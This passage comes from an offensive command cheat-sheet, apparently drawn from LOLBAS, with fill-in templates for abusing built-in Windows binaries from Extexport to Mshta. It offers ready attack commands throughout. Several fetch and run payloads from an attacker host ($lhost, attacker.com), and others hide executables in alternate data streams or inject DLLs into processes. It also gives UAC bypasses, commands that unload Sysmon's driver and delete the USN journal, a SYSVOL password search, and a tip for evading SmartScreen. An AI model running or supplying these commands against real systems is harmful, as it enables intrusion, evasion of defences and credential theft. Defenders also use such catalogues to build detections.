- `C:\Program Files (x86)\Internet Explorer\Extexport.exe`

### Extexport.exe Execute

Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Extexport.exe Execute"
Extexport.exe $dir foo bar
```
<!-- cheat
var dir
-->

## Extrac32.exe

Extract to ADS, copy or overwrite a file with Extrac32.exe

**Path(s):**
- `C:\Windows\System32\extrac32.exe`
- `C:\Windows\SysWOW64\extrac32.exe`

### Extrac32.exe ADS #1

Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file"
extrac32 $file_out $file_out:file.exe
```
<!-- cheat
var file_out
-->

### Extrac32.exe ADS #2

Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file"
extrac32 $file_out $file_out:file.exe
```
<!-- cheat
var file_out
-->

### Extrac32.exe Download #3

Copy the source file to the destination file and overwrite it.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copy the source file to the destination file and overwrite it"
extrac32 /Y /C \\$lhost\$share\$file $file_out
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Extrac32.exe Copy #4

Command for copying file from one folder to another

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Command for copying file from one folder to another"
extrac32.exe /C $file_out $file_out
```
<!-- cheat
var file_out
-->

## Findstr.exe

Write to ADS, discover, or download files with Findstr.exe

**Path(s):**
- `C:\Windows\System32\findstr.exe`
- `C:\Windows\SysWOW64\findstr.exe`

### Findstr.exe ADS #1

Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Findstr.exe ADS #1"
findstr /V /L W3AllLov3LolBas $file_out > $file_out:file.exe
```
<!-- cheat
var file_out
-->

### Findstr.exe ADS #2

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Findstr.exe ADS #2"
findstr /V /L W3AllLov3LolBas \\$lhost\$share\$file > $file_out:file.exe
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Findstr.exe Credentials #3

Search for stored password in Group Policy files stored on SYSVOL.

*Privileges: User • MITRE: T1552.001*

```cmd title:"Lolbas Search for stored password in Group Policy files stored on SYSVOL"
findstr /S /I cpassword \\sysvol\policies\*.xml
```
<!-- cheat
-->

### Findstr.exe Download #4

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Findstr.exe Download #4"
findstr /V /L W3AllLov3LolBas \\$lhost\$share\$file > $file_out
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

## Finger.exe

Displays information about a user or users on a specified remote computer that is running the Finger service or daemon

**Path(s):**
- `c:\windows\system32\finger.exe`
- `c:\windows\syswow64\finger.exe`

### Finger.exe Download

Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote Finger server"
finger user@example.host.com | more +2 | cmd
```
<!-- cheat
-->

## fltMC.exe

Filter Manager Control Program used by Windows

**Path(s):**
- `C:\Windows\System32\fltMC.exe`

### fltMC.exe Tamper

Unloads a driver used by security agents

*Privileges: Admin • MITRE: T1562.001*

```cmd title:"Lolbas Unloads a driver used by security agents"
fltMC.exe unload SysmonDrv
```
<!-- cheat
-->

## Forfiles.exe

Selects and executes a command on a file or set of files. This command is useful for batch processing.

**Path(s):**
- `C:\Windows\System32\forfiles.exe`
- `C:\Windows\SysWOW64\forfiles.exe`

### Forfiles.exe Execute #1

Executes specified command since there is a match for notepad.exe in the c:\windows\System32 folder.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes specified command since there is a match for notepad.exe in the c:\windows\System32 folder"
forfiles /p c:\windows\system32 /m notepad.exe /c "$cmd"
```
<!-- cheat
var cmd
-->

### Forfiles.exe ADS #2

Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\windows\system32 folder.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Forfiles.exe ADS #2"
forfiles /p c:\windows\system32 /m notepad.exe /c "$file_out:evil.exe"
```
<!-- cheat
var file_out
-->

## Fsutil.exe

File System Utility

**Path(s):**
- `C:\Windows\System32\fsutil.exe`
- `C:\Windows\SysWOW64\fsutil.exe`

### Fsutil.exe Tamper #1

Zero out a file

*Privileges: User • MITRE: T1485*

```cmd title:"Lolbas Zero out a file"
fsutil.exe file setZeroData offset=0 length=9999999999 $file_out
```
<!-- cheat
var file_out
-->

### Fsutil.exe Tamper #2

Delete the USN journal volume to hide file creation activity

*Privileges: User • MITRE: T1485*

```cmd title:"Lolbas Delete the USN journal volume to hide file creation activity"
fsutil.exe usn deletejournal /d c:
```
<!-- cheat
-->

### Fsutil.exe Execute #3

Executes a pre-planted binary named netsh.exe from the current directory.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes a pre-planted binary named netsh.exe from the current directory"
fsutil.exe trace decode
```
<!-- cheat
-->

## Ftp.exe

A binary designed for connecting to FTP servers

**Path(s):**
- `C:\Windows\System32\ftp.exe`
- `C:\Windows\SysWOW64\ftp.exe`

### Ftp.exe Execute #1

Executes the commands you put inside the text file.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes the commands you put inside the text file"
echo !$cmd > ftpcommands.txt && ftp -s:ftpcommands.txt
```
<!-- cheat
var cmd
-->

### Ftp.exe Download #2

Download

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download"
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```
<!-- cheat
-->

## Gpscript.exe

Used by group policy to process scripts

**Path(s):**
- `C:\Windows\System32\gpscript.exe`
- `C:\Windows\SysWOW64\gpscript.exe`

### Gpscript.exe Execute #1

Executes logon scripts configured in Group Policy.

*Privileges: Administrator • MITRE: T1218*

```cmd title:"Lolbas Executes logon scripts configured in Group Policy"
Gpscript /logon
```
<!-- cheat
-->

### Gpscript.exe Execute #2

Executes startup scripts configured in Group Policy

*Privileges: Administrator • MITRE: T1218*

```cmd title:"Lolbas Executes startup scripts configured in Group Policy"
Gpscript /startup
```
<!-- cheat
-->

## Hh.exe

Binary used for processing chm files in Windows

**Path(s):**
- `C:\Windows\hh.exe`
- `C:\Windows\SysWOW64\hh.exe`

### Hh.exe Download #1

Open the target batch script with HTML Help.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Open the target batch script with HTML Help"
HH.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Hh.exe Execute #2

Executes specified executable with HTML Help.

*Privileges: User • MITRE: T1218.001*

```cmd title:"Lolbas Executes specified executable with HTML Help"
HH.exe $file_out
```
<!-- cheat
var file_out
-->

### Hh.exe Execute #3

Executes a remote .chm file which can contain commands.

*Privileges: User • MITRE: T1218.001*

```cmd title:"Lolbas Executes a remote .chm file which can contain commands"
HH.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Ie4uinit.exe

Executes commands from a specially prepared ie4uinit.inf file.

**Path(s):**
- `c:\windows\system32\ie4uinit.exe`
- `c:\windows\sysWOW64\ie4uinit.exe`
- `c:\windows\system32\ieuinit.inf`
- `c:\windows\sysWOW64\ieuinit.inf`

### Ie4uinit.exe Execute

Executes commands from a specially prepared ie4uinit.inf file.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes commands from a specially prepared ie4uinit.inf file"
ie4uinit.exe -BaseSettings
```
<!-- cheat
-->

## iediagcmd.exe

Diagnostics Utility for Internet Explorer

**Path(s):**
- `C:\Program Files\Internet Explorer\iediagcmd.exe`

### iediagcmd.exe Execute

Executes binary that is pre-planted at C:\test\system32\netsh.exe.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes binary that is pre-planted at C:\test\system32\netsh.exe"
set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:$file_out
```
<!-- cheat
var file_out
-->

## Ieexec.exe

The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`

### Ieexec.exe Download #1

Downloads and executes executable from the remote server.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads and executes executable from the remote server"
ieexec.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Ieexec.exe Execute #2

Downloads and executes executable from the remote server.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Downloads and executes executable from the remote server"
ieexec.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Ilasm.exe

used for compile c# code into dll or exe.

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe`

### Ilasm.exe Compile #1

Binary file used by .NET to compile C#/intermediate (IL) code to .exe

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Binary file used by .NET to compile C#/intermediate (IL) code to .exe"
ilasm.exe $file_out /exe
```
<!-- cheat
var file_out
-->

### Ilasm.exe Compile #2

Binary file used by .NET to compile C#/intermediate (IL) code to dll

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Binary file used by .NET to compile C#/intermediate (IL) code to dll"
ilasm.exe $file_out /dll
```
<!-- cheat
var file_out
-->

## IMEWDBLD.exe

Microsoft IME Open Extended Dictionary Module

**Path(s):**
- `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`

### IMEWDBLD.exe Download

IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas IMEWDBLD.exe Download"
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Infdefaultinstall.exe

Binary used to perform installation based on content inside inf files

**Path(s):**
- `C:\Windows\System32\Infdefaultinstall.exe`
- `C:\Windows\SysWOW64\Infdefaultinstall.exe`

### Infdefaultinstall.exe Execute

Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.

*Privileges: Admin • MITRE: T1218*

```cmd title:"Lolbas Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file"
InfDefaultInstall.exe $file_out
```
<!-- cheat
var file_out
-->

## Installutil.exe

The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

### Installutil.exe AWL Bypass #1

Execute the target .NET DLL or EXE.

*Privileges: User • MITRE: T1218.004*

```cmd title:"Lolbas Execute the target .NET DLL or EXE"
InstallUtil.exe /logfile= /LogToConsole=false /U $file_out
```
<!-- cheat
var file_out
-->

### Installutil.exe Execute #2

Execute the target .NET DLL or EXE.

*Privileges: User • MITRE: T1218.004*

```cmd title:"Lolbas Execute the target .NET DLL or EXE"
InstallUtil.exe /logfile= /LogToConsole=false /U $file_out
```
<!-- cheat
var file_out
-->

### Installutil.exe Download #3

It will download a remote payload and place it in INetCache.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
InstallUtil.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## iscsicpl.exe

Microsoft iSCSI Initiator Control Panel tool

**Path(s):**
- `c:\windows\system32\iscsicpl.exe`
- `c:\windows\syswow64\iscsicpl.exe`

### iscsicpl.exe UAC Bypass #1

c:\windows\syswow64\iscsicpl.exe has a DLL injection through `C:\Users\<username>\AppData\Local\Microsoft\WindowsApps\ISCSIEXE.dll`, resulting in UAC bypass.

*Privileges: User • MITRE: T1548.002*

```cmd title:"Lolbas iscsicpl.exe UAC Bypass #1"
c:\windows\syswow64\iscsicpl.exe
```
<!-- cheat
-->

### iscsicpl.exe UAC Bypass #2

Both `c:\windows\system32\iscsicpl.exe` and `c:\windows\system64\iscsicpl.exe` have UAC bypass through launching iscicpl.exe, then navigating into the Configuration tab, clicking Report, then launching your custom command.

*Privileges: User • MITRE: T1548.002*

```cmd title:"Lolbas iscsicpl.exe UAC Bypass #2"
iscsicpl.exe
```
<!-- cheat
-->

## Jsc.exe

Binary file used by .NET to compile JavaScript code to .exe or .dll format

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Jsc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Jsc.exe`
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Jsc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Jsc.exe`

### Jsc.exe Compile #1

Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Jsc.exe Compile #1"
jsc.exe $file_out
```
<!-- cheat
var file_out
-->

### Jsc.exe Compile #2

Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Jsc.exe Compile #2"
jsc.exe /t:library $file_out
```
<!-- cheat
var file_out
-->

## Ldifde.exe

Creates, modifies, and deletes LDAP directory objects.

**Path(s):**
- `c:\windows\system32\ldifde.exe`
- `c:\windows\syswow64\ldifde.exe`

### Ldifde.exe Download

Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.

*Privileges: Administrator • MITRE: T1105*

```cmd title:"Lolbas Import specified .ldf file into LDAP"
Ldifde -i -f $file_out
```
<!-- cheat
var file_out
-->

## Makecab.exe

Binary to package existing files into a cabinet (.cab) file

**Path(s):**
- `C:\Windows\System32\makecab.exe`
- `C:\Windows\SysWOW64\makecab.exe`

### Makecab.exe ADS #1

Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Makecab.exe ADS #1"
makecab $file_out $file_out:autoruns.cab
```
<!-- cheat
var file_out
-->

### Makecab.exe ADS #2

Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Makecab.exe ADS #2"
makecab \\$lhost\$share\$file $file_out:file.cab
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Makecab.exe Download #3

Download and compresses the target file and stores it in the target file.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download and compresses the target file and stores it in the target file"
makecab \\$lhost\$share\$file $file_out
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Makecab.exe Execute #4

Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.

*Privileges: User • MITRE: T1036*

```cmd title:"Lolbas Makecab.exe Execute #4"
makecab /F $file_out
```
<!-- cheat
var file_out
-->

## Mavinject.exe

Used by App-v in Windows

**Path(s):**
- `C:\Windows\System32\mavinject.exe`
- `C:\Windows\SysWOW64\mavinject.exe`

### Mavinject.exe Execute #1

Inject evil.dll into a process with PID 3110.

*Privileges: User • MITRE: T1218.013*

```cmd title:"Lolbas Inject evil.dll into a process with PID 3110"
MavInject.exe 3110 /INJECTRUNNING $file_out
```
<!-- cheat
var file_out
-->

### Mavinject.exe ADS #2

Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172"
Mavinject.exe 4172 /INJECTRUNNING $file_out:file.dll
```
<!-- cheat
var file_out
-->

## Microsoft.Workflow.Compiler.exe

A utility included with .NET that is capable of compiling and executing C# or VB.net code.

**Path(s):**
- `C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe`

### Microsoft.Workflow.Compiler.exe Execute #1

Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted).

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Compile and execute XOML workflow code"
Microsoft.Workflow.Compiler.exe $file_out $file_out
```
<!-- cheat
var file_out
-->

### Microsoft.Workflow.Compiler.exe Execute #2

Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file"
Microsoft.Workflow.Compiler.exe $file_out $file_out
```
<!-- cheat
var file_out
-->

### Microsoft.Workflow.Compiler.exe AWL Bypass #3

Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file"
Microsoft.Workflow.Compiler.exe $file_out $file_out
```
<!-- cheat
var file_out
-->

## Mmc.exe

Load snap-ins to locally and remotely manage Windows systems

**Path(s):**
- `C:\Windows\System32\mmc.exe`
- `C:\Windows\SysWOW64\mmc.exe`

### Mmc.exe Execute #1

Launch a 'backgrounded' MMC process and invoke a COM payload

*Privileges: User • MITRE: T1218.014*

```cmd title:"Lolbas Launch a 'backgrounded' MMC process and invoke a COM payload"
mmc.exe -Embedding $file_out
```
<!-- cheat
var file_out
-->

### Mmc.exe UAC Bypass #2

Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC.

*Privileges: Administrator • MITRE: T1218.014*

```cmd title:"Lolbas Mmc.exe UAC Bypass #2"
mmc.exe gpedit.msc
```
<!-- cheat
-->

### Mmc.exe Download #3

Download and save an executable to disk

*Privileges: User • MITRE: T1218.014*

```cmd title:"Lolbas Download and save an executable to disk"
mmc.exe -Embedding $file_out
```
<!-- cheat
var file_out
-->

## MpCmdRun.exe

Binary part of Windows Defender. Used to manage settings in Windows Defender

**Path(s):**
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe`
- `C:\Program Files\Windows Defender\MpCmdRun.exe`
- `C:\Program Files (x86)\Windows Defender\MpCmdRun.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\X86\MpCmdRun.exe`

### MpCmdRun.exe Download #1

Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)"
MpCmdRun.exe -DownloadFile -url $scheme://$lhost:$lport/$file -path $file_out
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### MpCmdRun.exe Download #2

Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download file to specified path"
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" $file_in && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "$file_in" -DownloadFile -url $scheme://$lhost:$lport/$file -path $file_in
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_in
-->

### MpCmdRun.exe ADS #3

Download file to machine and store it in Alternate Data Stream

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Download file to machine and store it in Alternate Data Stream"
MpCmdRun.exe -DownloadFile -url $scheme://$lhost:$lport/$file -path $file_out:evil.exe
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

## Msbuild.exe

Used to compile and execute code

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe`
- `C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe`
- `C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe`
- `C:\Program Files (x86)\MSBuild\14.0\bin\MSBuild.exe`

### Msbuild.exe AWL Bypass #1

Build and execute a C# project stored in the target XML file.

*Privileges: User • MITRE: T1127.001*

```cmd title:"Lolbas Build and execute a C# project stored in the target XML file"
msbuild.exe $file_out
```
<!-- cheat
var file_out
-->

### Msbuild.exe Execute #2

Build and execute a C# project stored in the target csproj file.

*Privileges: User • MITRE: T1127.001*

```cmd title:"Lolbas Build and execute a C# project stored in the target csproj file"
msbuild.exe $file_out
```
<!-- cheat
var file_out
-->

### Msbuild.exe Execute #3

Executes generated Logger DLL file with TargetLogger export.

*Privileges: User • MITRE: T1127.001*

```cmd title:"Lolbas Executes generated Logger DLL file with TargetLogger export"
msbuild.exe /logger:TargetLogger,$file_out;MyParameters,Foo
```
<!-- cheat
var file_out
-->

### Msbuild.exe Execute #4

Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.

*Privileges: User • MITRE: T1127.001*

```cmd title:"Lolbas Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+"
msbuild.exe $file_out
```
<!-- cheat
var file_out
-->

### Msbuild.exe Execute #5

By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line.

*Privileges: User • MITRE: T1036*

```cmd title:"Lolbas Msbuild.exe Execute #5"
msbuild.exe @$file_out
```
<!-- cheat
var file_out
-->

## Msconfig.exe

MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows

**Path(s):**
- `C:\Windows\System32\msconfig.exe`

### Msconfig.exe Execute

Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml.

*Privileges: Administrator • MITRE: T1218*

```cmd title:"Lolbas Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml"
Msconfig.exe -5
```
<!-- cheat
-->

## Msdt.exe

Microsoft diagnostics tool

**Path(s):**
- `C:\Windows\System32\Msdt.exe`
- `C:\Windows\SysWOW64\Msdt.exe`

### Msdt.exe Execute #1

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file"
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af $file_out /skip TRUE
```
<!-- cheat
var file_out
-->

### Msdt.exe AWL Bypass #2

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file"
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af $file_out /skip TRUE
```
<!-- cheat
var file_out
-->

### Msdt.exe AWL Bypass #3

Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Msdt.exe AWL Bypass #3"
msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
```
<!-- cheat
-->

## Msedge.exe

Microsoft Edge browser

**Path(s):**
- `c:\Program Files\Microsoft\Edge\Application\msedge.exe`
- `c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`

### Msedge.exe Download #1

Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Edge will launch and download the file"
msedge.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Msedge.exe Download #2

Edge will silently download the file. File extension should be .html and binaries should be encoded.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Edge will silently download the file. File extension should be .html and binaries should be encoded"
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "$scheme://$lhost:$lport/$file" > $file_out
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### Msedge.exe Execute #3

Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command"
msedge.exe --disable-gpu-sandbox --gpu-launcher="$cmd &&"
```
<!-- cheat
var cmd
-->

## msedge_proxy.exe

Microsoft Edge Browser

**Path(s):**
- `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe`

### msedge_proxy.exe Download #1

msedge_proxy will download malicious file.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas msedge_proxy will download malicious file"
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### msedge_proxy.exe Execute #2

msedge_proxy.exe will execute file in the background

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas msedge_proxy.exe will execute file in the background"
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="$cmd &&"
```
<!-- cheat
var cmd
-->

## msedgewebview2.exe

msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.

**Path(s):**
- `C:\Program Files (x86)\Microsoft\Edge\Application\114.0.1823.43\msedgewebview2.exe`
- `C:\Program Files (x86)\Microsoft\EdgeWebView\Application\131.0.2903.70\msedgewebview2.exe`

### msedgewebview2.exe Execute #1

This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess.

*Privileges: Low privileges • MITRE: T1218.015*

```cmd title:"Lolbas msedgewebview2.exe Execute #1"
msedgewebview2.exe --no-sandbox --browser-subprocess-path="$file_out"
```
<!-- cheat
var file_out
-->

### msedgewebview2.exe Execute #2

This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas msedgewebview2.exe Execute #2"
msedgewebview2.exe --utility-cmd-prefix="$cmd"
```
<!-- cheat
var cmd
-->

### msedgewebview2.exe Execute #3

This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas msedgewebview2.exe Execute #3"
msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="$cmd"
```
<!-- cheat
var cmd
-->

### msedgewebview2.exe Execute #4

This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas msedgewebview2.exe Execute #4"
msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="$cmd"
```
<!-- cheat
var cmd
-->

## Mshta.exe

Used by Windows to execute html applications. (.hta)

**Path(s):**
- `C:\Windows\System32\mshta.exe`
- `C:\Windows\SysWOW64\mshta.exe`

### Mshta.exe Execute #1

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

*Privileges: User • MITRE: T1218.005*

```cmd title:"Lolbas Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript"
mshta.exe $file_out
```
<!-- cheat
var file_out
-->

### Mshta.exe Execute #2

Executes VBScript supplied as a command line argument.

*Privileges: User • MITRE: T1218.005*

```cmd title:"Lolbas Executes VBScript supplied as a command line argument"
mshta.exe vbscript:Close(Execute("GetObject(""script:$scheme://$lhost:$lport/$file"")"))
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Mshta.exe Execute #3

Executes JavaScript supplied as a command line argument.

*Privileges: User • MITRE: T1218.005*

```cmd title:"Lolbas Executes JavaScript supplied as a command line argument"
mshta.exe javascript:a=GetObject("script:$scheme://$lhost:$lport/$file").Exec();close();
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Mshta.exe ADS #4

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

*Privileges: User • MITRE: T1218.005*

```cmd title:"Lolbas Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript"
mshta.exe "$file_out:file.hta"
```
<!-- cheat
var file_out
-->

### Mshta.exe Download #5

It will download a remote payload and place it in INetCache.

